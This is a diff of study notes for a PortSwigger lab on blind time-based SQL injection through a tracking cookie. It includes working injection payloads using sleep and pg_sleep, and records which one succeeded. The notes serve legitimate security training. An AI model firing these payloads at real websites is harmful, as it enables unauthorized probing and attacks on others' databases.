@@ -1,3 +1,5 @@
+https://portswigger.net/web-security/sql-injection/blind/lab-time-delays
+
 Lab #13 - Blind SQL Injection with time delays
 
 Vulnerable parameter - tracking cookie
@@ -6,10 +8,12 @@ End Goal:
 - to prove that the field is vulnerable to blind SQLi (time based)
 
 Analysis:
-
+Check the Cheat sheet for different database time delay stmts and fuzz through all the dbs to check all.
+check the difference bw previous and this we are comment outing the rest unlike closing the query with '
+as the stmt might be like below
 select tracking-id from tracking-table where trackingid='OVmpehhTPt2iCL19'|| (SELECT sleep(10))--';
 
-' || (SELECT sleep(10))-- -x
-' || (SELECT pg_sleep(10))-- 
+' || (SELECT sleep(10))-- #didnt work
+' || (SELECT pg_sleep(10))-- #worked
 
 script.py <url>
